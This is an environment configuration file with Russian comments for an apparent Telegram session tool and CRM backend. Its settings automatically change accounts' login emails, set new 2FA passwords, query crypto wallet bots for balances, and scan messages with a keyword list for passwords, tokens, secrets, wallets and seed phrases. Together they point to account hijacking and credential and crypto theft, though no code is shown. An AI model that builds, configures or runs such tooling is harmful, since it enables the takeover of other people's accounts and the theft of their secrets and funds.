###############################################
# Telegram API Credentials
###############################################
API_ID=
API_HASH=

###############################################
# Session storage
###############################################
SESSION_DIR=telegram-sessions

###############################################
# Login Email Rotation (choose ONE of the two)
# 1) EMAIL_LIST       - список через запятую / точку с запятой / пробелы
# 2) EMAIL_LIST_JSON  - JSON-массив строк
# Если заданы оба, приоритет у EMAIL_LIST_JSON.
# Примеры:
# EMAIL_LIST=one@example.com,two@example.com,three@example.com
# EMAIL_LIST_JSON=["one@example.com","two@example.com","three@example.com"]
EMAIL_LIST=
EMAIL_LIST_JSON=

# Дополнительно (опционально): индивидуальные настройки для каждого ящика.
# Формат JSON: {"one@example.com":{"user":"one@example.com","password":"app_pass","imap_server":"imap.gmail.com","imap_port":993}}
EMAIL_ACCOUNTS_JSON=

###############################################
# IMAP Credentials (общая учётка или пусто если все по EMAIL_ACCOUNTS_JSON)
# Скрипт auto_change_login_email сначала пытается найти конкретный ящик в EMAIL_ACCOUNTS_JSON,
# если не нашёл — использует эти общие значения.
###############################################
IMAP_SERVER=imap.gmail.com
IMAP_PORT=993
IMAP_USER=
IMAP_PASSWORD=

###############################################
# Patterns search (comma / semicolon / space separated)
###############################################
SEARCH_PATTERNS=

###############################################
# Crypto wallet bots & commands
###############################################
CRYPTO_WALLET_BOTS=@wallet,@CryptoBot,@Bitcoin_wallet_bot
CRYPTO_BALANCE_COMMANDS=balance,wallet

###############################################
# 2FA / Password (если понадобится автоматическая установка)
###############################################
NEW_2FA_PASSWORD=

###############################################
# Доп. переменные для устойчивости / таймаутов (опционально)
# EMAIL_VERIFY_TIMEOUT_MINUTES=10
# TELETHON_CONNECTION_RETRIES=3
###############################################

###############################################
# Backend/DB/Push (используется docker-compose)
###############################################
# Postgres
DB_USER=crm_user
DB_PASSWORD=crm_password
DB_NAME=crm_db
DB_SSL=false

# JWT
JWT_SECRET=замените-на-сложный-случайный-secret
JWT_EXPIRY=7d

# Telegram API для backend (если задействованы)
TELEGRAM_PRIMARY_API_ID=
TELEGRAM_PRIMARY_API_HASH=
TELEGRAM_FALLBACK_API_ID=
TELEGRAM_FALLBACK_API_HASH=
TELEGRAM_SESSION_PATH=/app/telegram-sessions

# Email/IMAP (общие)
EMAIL_LIST=
EMAIL_LIST_JSON=
EMAIL_ACCOUNTS_JSON=
IMAP_SERVER=imap.gmail.com
IMAP_PORT=993
IMAP_USER=
IMAP_PASSWORD=

# Поиск паттернов
SEARCH_PATTERNS=пароль,password,pass,логин,login,крипта,crypto,ключ,key,токен,token,секрет,secret,wallet,кошелек,seed,сид,phrase
CRYPTO_WALLET_BOTS=@wallet,@CryptoBot,@BitcoinWalletBot

# Web Push VAPID
VAPID_PUBLIC_KEY=
VAPID_PRIVATE_KEY=
VAPID_CONTACT_EMAIL=mailto:admin@example.com

# Frontend build (оставляем относительный путь — работает за прокси)
VITE_API_URL=/api
